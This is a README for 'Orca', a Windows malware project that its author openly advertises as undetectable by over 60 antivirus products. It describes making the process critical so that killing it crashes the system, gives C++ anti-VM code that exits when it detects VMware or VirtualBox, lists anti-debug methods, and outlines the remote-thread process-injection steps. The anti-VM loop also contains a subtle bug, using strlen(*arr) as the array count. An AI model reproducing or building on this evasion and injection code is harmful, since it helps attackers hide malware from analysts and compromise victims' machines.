
# About Orca

* Orca is an Advanced Malware with multifeatures written in ASM/C/C++ 

# features
* Run in Background (Hidden Mode)

### Critical Process using RtlSetProcessIsCritical

* RtlSetProcessIsCritical makes the process critical, any attempt to terminate it will BSOD the system (Blue Screen of Death) , although it can be bypassed easly using NtSetInformationProcess by injecting DLL into it , i made PoC of it you can check it from here [BypassRtlSetProcessIsCritical](https://github.com/ZeroM3m0ry/BypassRtlSetProcessIsCritical)


<br>
<img src="https://github.com/walczy/Skinjbir/blob/main/r2.jpg"></img>
<br>

* Undectable  (60+ Antivirus )

<br>
<img src="https://github.com/walczy/Skinjbir/blob/main/r1.JPG"></img>
<br>

### Detecting Virtual Environment Files and Processes
* Code Snippets
* the following Function will search for VMware Processes

```cpp
void antiVm()
{
	const char* arr[] = { "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe" ,"VGAuthService.exe" ,"vmacthlp.exe" };
	for (int i = 0; i < strlen(*arr); i++)
	{
		if (GetPID(arr[i]))
			exit(EXIT_FAILURE);
	}
}
```
* the following Function will search for VirtualBox Files

```cpp
void antiVr() {
	if  (IsExist("C:\\windows\\System32\\vboxoglpackspu.dll"))exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\Drivers\\VBoxSF.sys")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxoglpassthroughspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxdisp.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxhook.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxmrxnp.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxogl.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxoglcrutil.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxoglerrorspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxoglfeedbackspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")) exit(EXIT_FAILURE);
	else if (IsExist("C:\\windows\\System32\\vboxoglarrayspu.dll")) exit(EXIT_FAILURE);
}
```



### Anti-Debug
* the Malware will self close 'Silently' anytime detect a debugger or being debugged!! [AntiDBG Library](https://github.com/HackOvert/AntiDBG) 
-  The techniques that used to Detect debuggers :
```  
  - Memory
  - CPU
  - Timing
  - Forced Exceptions
  ```
# Process Injection

* [Process Injection](https://github.com/ZeroM3m0ry/Shellcode-Injector) It is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
* 
![Alt Text](https://github.com/ZeroM3m0ry/Orca/blob/main/pe-injection.gif)


### TECHNICAL DETAILS

* Open process with Access Rights
* LPTHREAD_START_ROUTINE (its a pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread and represents the starting address of the thread in the remote process. The function must exist in the remote process.)
* VirtualAllocEx (used to allocate space from the target process virtual memory)
* WriteProcessMemory (used to write the path of the shellcode into the allocated memory)
* CreateRemoteThread (used to creates a thread in the virtual memory area of a process)

### More Advanced features will  be added soon
# Disclaimer
* I take no responsibility for Harmful using or any damage can make. Use it at your own risk.

